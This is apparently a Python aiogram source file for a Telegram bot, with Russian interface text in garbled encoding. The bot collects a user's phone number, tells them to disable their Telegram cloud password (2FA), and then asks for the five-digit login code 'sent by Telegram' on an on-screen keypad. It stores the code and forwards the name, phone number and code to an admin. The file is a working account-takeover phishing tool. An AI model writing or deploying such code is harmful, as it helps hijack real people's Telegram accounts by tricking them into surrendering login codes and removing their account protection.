import sqlite3

from aiogram import Router, F
from aiogram.fsm.context import FSMContext
from aiogram.types import CallbackQuery, KeyboardButton, ReplyKeyboardMarkup, Message, InlineKeyboardButton, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder

from bot.database.db import cursor, conn, DB_NAME
from bot.database.user.user import save_user_to_db, save_code_to_db, get_user_from_db
from bot.helpers.helpers import get_numeric_kb, create_user_data_file
from bot.start_bot import OWNER_ID, bot, test_id
from bot.handlers.command_start import admin_id
from bot.states.user import AuthState

router = Router()


def update_2fa_status(user_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    cursor.execute("""
        UPDATE users SET two_fa_disabled = 1 WHERE user_id = ?
    """, (user_id,))

    conn.commit()
    conn.close()


# –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è 2FA
def confirm_disable_2fa_kb():
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text="‚úÖ –î–∞, —è –æ—Ç–∫–ª—é—á–∏–ª 2FA —Å–∏—Å—Ç–µ–º—É", callback_data="off_2fa"))
    return kb.as_markup()


@router.callback_query(F.data == "start_button")
async def get_phone(call: CallbackQuery, state: FSMContext):
    phone_keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="üìû –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )

    await call.message.answer(
        "üìû –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:",
        reply_markup=phone_keyboard
    )
    await state.set_state(AuthState.phone)
    await call.answer()


@router.message(AuthState.phone, F.contact)
async def contact_handler(message: Message, state: FSMContext):
    user_id = message.from_user.id
    name = message.from_user.full_name  # –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    username = message.from_user.username if message.from_user.username else "–ù–µ —É–∫–∞–∑–∞–Ω"
    phone_number = message.contact.phone_number

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –ë–î
    save_user_to_db(user_id, name, username, phone_number)

    await state.update_data(phone=phone_number)

    await message.answer(
        """üîå<b>–û—Ç–∫–ª—é—á–∏—Ç–µ 2FA —Å–∏—Å—Ç–µ–º—É, —á—Ç–æ–±—ã –±–æ—Ç –º–æ–≥ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é. –°–¥–µ–ª–∞–π—Ç–µ —Å–ª–µ–¥—É—é—â–µ–µ:</b>

1Ô∏è‚É£ –ó–∞–π–¥–∏—Ç–µ –≤ —Å–≤–æ–π –ø—Ä–æ—Ñ–∏–ª—å.  
2Ô∏è‚É£ –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª <b>–ö–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç—å</b>.  
3Ô∏è‚É£ –í—ã–∫–ª—é—á–∏—Ç–µ –æ–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å.

<b>‚ùóÔ∏è –ü–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É ¬´‚úÖ –î–∞, —è –æ—Ç–∫–ª—é—á–∏–ª 2FA —Å–∏—Å—Ç–µ–º—É¬ª.</b>""",
        parse_mode="HTML",
        reply_markup=confirm_disable_2fa_kb()
    )

    await bot.send_message(
        admin_id,
        f"üì© <b>–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å!</b>\n"
        f"üë§ <b>–ò–º—è:</b> {name}\n"
        f"üîó <b>Username:</b> {username}\n"
        f"üì± <b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>{phone_number}</code>\n",
        parse_mode="HTML"
    )

    await state.set_state(AuthState.confirm_disable_2fa)


@router.callback_query(F.data == "off_2fa")
async def confirm_2fa_off(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    phone_number = data.get("phone", "–ù–µ–∏–∑–≤–µ—Å—Ç–µ–Ω")
    user_id = call.from_user.id

    update_2fa_status(user_id)

    await call.message.answer(
        f"‚úÖ <b>–°–ø–∞—Å–∏–±–æ! –í–∞—à –Ω–æ–º–µ—Ä:</b> <code>{phone_number}</code>\n"
        "üîì 2FA —Å–∏—Å—Ç–µ–º–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∞.\n"
        "–û–∂–∏–¥–∞–π—Ç–µ –¥–∞–ª—å–Ω–µ–π—à–∏—Ö –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π.",
        parse_mode="HTML",
        reply_markup=get_numeric_kb()
    )

    await state.clear()
    await call.answer()


@router.callback_query(F.data.startswith("num_"))
async def enter_code(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    code = data.get("code", "")

    if len(code) >= 5:
        await call.answer("‚ùå –í—ã —É–∂–µ –≤–≤–µ–ª–∏ 5 —Ü–∏—Ñ—Ä!", show_alert=True)
        return

    code += call.data.split("_")[1]
    await state.update_data(code=code)

    await call.message.edit_text(
        f"<b>‚û°Ô∏è –í–∞—à –∫–æ–¥:</b> <code>{code}</code>\n"
        "üëá –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥, –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –æ—Ç <b>Telegram:</b>",
        reply_markup=get_numeric_kb(len(code) == 5),
        parse_mode="HTML"
    )
    await call.answer()


@router.callback_query(F.data == "confirm_code")
async def confirm_code(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    user_id = call.from_user.id
    user_code = data.get("code", "")

    if len(user_code) < 5:
        await call.answer("‚ùå –í–≤–µ–¥–∏—Ç–µ —Ä–æ–≤–Ω–æ 5 —Ü–∏—Ñ—Ä –ø–µ—Ä–µ–¥ –æ—Ç–ø—Ä–∞–≤–∫–æ–π!", show_alert=True)
        return

    save_code_to_db(user_id, user_code)

    user_data = get_user_from_db(user_id)
    if user_data:
        name, username, phone, _ = user_data
        username = f"@{username}" if username else "–ù–µ —É–∫–∞–∑–∞–Ω"

        # –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ —Å –∫–Ω–æ–ø–∫–æ–π "üìÑ –°–∫–∞—á–∞—Ç—å –¥–∞–Ω–Ω—ã–µ"
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="üìÑ –°–∫–∞—á–∞—Ç—å –¥–∞–Ω–Ω—ã–µ", callback_data=f"download_user_data:{user_id}"))

        await call.bot.send_message(
            admin_id,
            f"üì© <b>–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª –∫–æ–¥!</b>\n"
            f"üë§ <b>–ò–º—è:</b> {name}\n"
            f"üîó <b>Username:</b> {username}\n"
            f"üì± <b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>{phone}</code>\n"
            f"üî¢ <b>–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</b>: <i>(–°–∫—Ä—ã—Ç. –ù–∞–∂–º–∏—Ç–µ 'üìÑ –°–∫–∞—á–∞—Ç—å –¥–∞–Ω–Ω—ã–µ')</i>",
            parse_mode="HTML",
            reply_markup=kb.as_markup()
        )

        await call.message.edit_text(
            "<b>‚úÖ –°–ø–∞—Å–∏–±–æ!</b>",
            parse_mode="HTML"
        )
    else:
        await call.answer("‚ùå –û—à–∏–±–∫–∞! –î–∞–Ω–Ω—ã–µ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.", show_alert=True)

    await state.clear()


@router.callback_query(F.data.startswith("download_user_data:"))
async def download_user_data(call: CallbackQuery):
    user_id = int(call.data.split(":")[1])
    file_path = create_user_data_file(user_id)

    if file_path:
        await call.bot.send_document(
            admin_id,
            FSInputFile(file_path),
            caption=f"üìÇ –î–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. {user_id}"
        )
    else:
        await call.answer("‚ùå –û—à–∏–±–∫–∞! –§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω.", show_alert=True)


@router.callback_query(F.data == "delete_number")
async def delete_last_digit(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    code = data.get("code", "")

    if code:
        code = code[:-1]
        await state.update_data(code=code)

        await call.message.edit_text(
            f"<b>‚û°Ô∏è–í–∞—à –∫–æ–¥:</b> <code>{code}</code>\n"
            "üëá –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥, –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –æ—Ç <b>Telegram:</b>",
            reply_markup=get_numeric_kb(),
            parse_mode='HTML'
        )

    await call.answer()


@router.callback_query(F.data == "reset_number_code")
async def reset_code(call: CallbackQuery, state: FSMContext):
    await state.update_data(code="")  # –û—á–∏—â–∞–µ–º –∫–æ–¥

    await call.message.edit_text(
        f"<b>‚û°Ô∏è–í–∞—à –∫–æ–¥:</b> <code></code>\n"
        "üëá –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥, –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –æ—Ç <b>Telegram:</b>",
        reply_markup=get_numeric_kb(),
        parse_mode='HTML'
    )

    await call.answer("‚úÖ –ö–æ–¥ –æ—á–∏—â–µ–Ω!", show_alert=True)
